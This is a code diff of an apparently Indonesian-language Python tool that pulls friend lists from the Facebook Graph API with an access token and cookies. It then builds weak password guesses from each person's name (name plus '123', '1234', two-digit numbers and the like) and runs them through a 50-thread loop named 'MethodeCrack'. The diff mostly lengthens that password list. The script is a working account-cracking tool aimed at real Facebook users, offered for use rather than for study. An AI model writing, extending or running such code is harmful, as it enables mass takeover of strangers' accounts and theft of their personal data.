@@ -126,8 +126,7 @@ def menu():
 
     for user_id in uid:
         try:
-            req = ses.get(f'https://graph.facebook.com/{user_id}?fields=friends.fields(id,name)&access_token={token}', 
-                          cookies={'cookies': cok}).json()
+            req = ses.get(f'https://graph.facebook.com/{user_id}?fields=friends.fields(id,name)&access_token={token}', cookies={'cookies': cok}).json()
             for friend in req.get('friends', {}).get('data', []):
                 try:
                     full_name = friend["name"]
@@ -158,7 +157,6 @@ def menu():
 
 def setting():
     print(f"{P}Setting function placeholder{P}")
-# ---- setting urutan & metode.
 def setting():
     print("")
     print(f"\n{P}  [{O}+{P}] 1. urutan new ke old. \n  [{O}+{P}] 2. urutan random. {P}")
@@ -191,12 +189,33 @@ def Passww():
 
     def generate_passwords(depan, belakang):
         pasw = []
-
-        # Menambahkan password dasar
         pasw.append(depan + '123')
         pasw.append(depan + '1234')
         pasw.append(depan + '12345')
-
+        pasw.append(depan + '12345')
+        pasw.append(depan + '123456')
+        pasw.append(depan + '1234567')
+        pasw.append(depan + '12345678')
+        pasw.append(depan + '123456789')
+        pasw.append(depan + '12')
+        pasw.append(depan + '11')
+        pasw.append(depan + '13')
+        pasw.append(depan + '14')
+        pasw.append(depan + '15')
+        pasw.append(depan + '16')
+        pasw.append(depan + '17')
+        pasw.append(depan + '18')
+        pasw.append(depan + '19')
+        pasw.append(depan + '20')
+        pasw.append(depan + '21')
+        pasw.append(depan + '22')
+        pasw.append(depan + '23')
+        pasw.append(depan + '24')
+        pasw.append(depan + '25')
+        pasw.append(depan + '26')
+        pasw.append(depan + '27')
+        pasw.append(depan + '28')
+        pasw.append(depan + '29')
         return pasw
 
     with tred(max_workers=50) as MethodeCrack:
